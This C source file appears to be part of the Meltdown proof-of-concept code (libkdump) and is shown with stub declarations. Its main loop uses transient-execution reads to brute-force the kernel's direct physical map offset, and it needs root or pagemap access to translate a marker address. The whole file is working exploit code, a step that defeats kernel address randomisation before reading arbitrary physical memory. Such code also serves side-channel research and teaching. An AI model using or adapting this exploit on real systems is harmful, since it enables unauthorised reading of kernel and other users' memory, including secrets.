
typedef unsigned long size_t;
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;

typedef int bool;




typedef struct TYPE_4__ TYPE_1__ ;


struct TYPE_4__ {int retries; int measurements; } ;
typedef TYPE_1__ libkdump_config_t ;


 size_t DEFAULT_PHYSICAL_OFFSET ;
 int exit (int) ;
 int fflush (int ) ;
 int libkdump_cleanup () ;
 int libkdump_enable_debug (int ) ;
 TYPE_1__ libkdump_get_autoconfig () ;
 int libkdump_init (TYPE_1__) ;
 int libkdump_read (size_t) ;
 size_t libkdump_virt_to_phys (size_t) ;
 int printf (char*,...) ;
 int stdout ;

int main(int argc, char *argv[]) {
  size_t scratch[4096];
  libkdump_config_t config;
  size_t offset = DEFAULT_PHYSICAL_OFFSET;

  size_t step = 0x800000000ll;



  size_t delta = -2 * step;
  int progress = 0;

  libkdump_enable_debug(0);

  config = libkdump_get_autoconfig();
  config.retries = 10;
  config.measurements = 1;

  libkdump_init(config);

  size_t var = (size_t)(scratch + 2048);
  *(char *)var = 'X';

  size_t start = libkdump_virt_to_phys(var);
  if (!start) {
    printf("\x1b[31;1m[!]\x1b[0m Program requires root privileges (or read access to /proc/<pid>/pagemap)!\n");
    exit(1);
  }

  while (1) {
    *(volatile char *)var = 'X';
    *(volatile char *)var = 'X';
    *(volatile char *)var = 'X';
    *(volatile char *)var = 'X';
    *(volatile char *)var = 'X';

    int res = libkdump_read(start + offset + delta);
    if (res == 'X') {
      printf("\r\x1b[32;1m[+]\x1b[0m Direct physical map offset: \x1b[33;1m0x%zx\x1b[0m\n", offset + delta);
      fflush(stdout);
      break;
    } else {
      delta += step;
      if (delta >= -1ull - offset) {
        delta = 0;
        step >>= 4;
      }
      printf("\r\x1b[34;1m[%c]\x1b[0m 0x%zx    ", "/-\\|"[(progress++ / 400) % 4], offset + delta);
    }
  }

  libkdump_cleanup();

  return 0;
}
